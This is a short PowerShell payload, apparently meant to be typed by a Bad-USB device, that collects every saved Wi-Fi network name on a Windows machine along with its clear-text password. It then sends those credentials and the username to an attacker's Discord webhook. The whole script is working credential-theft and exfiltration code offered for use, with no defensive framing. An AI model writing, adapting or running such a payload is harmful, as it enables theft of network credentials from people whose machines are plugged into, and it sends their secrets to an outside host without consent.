# This will look for all WLANs on a windows host and export via discord webhook.
# Be sure to have the "$discord" entered into beginning of the entered command in the Bad-USB

netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value.Trim()

    $passMatch = netsh wlan show profile name="$wlan" key=clear | Select-String '(?<=Key Content\s+:\s).+'
    $passw = if ($passMatch) { $passMatch.Matches.Value.Trim() } else { "<No Password>" }

    $Body = @{
        'username' = $env:username
        'content'  = "SSID: $wlan `nPassword: $passw"
    }

    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}
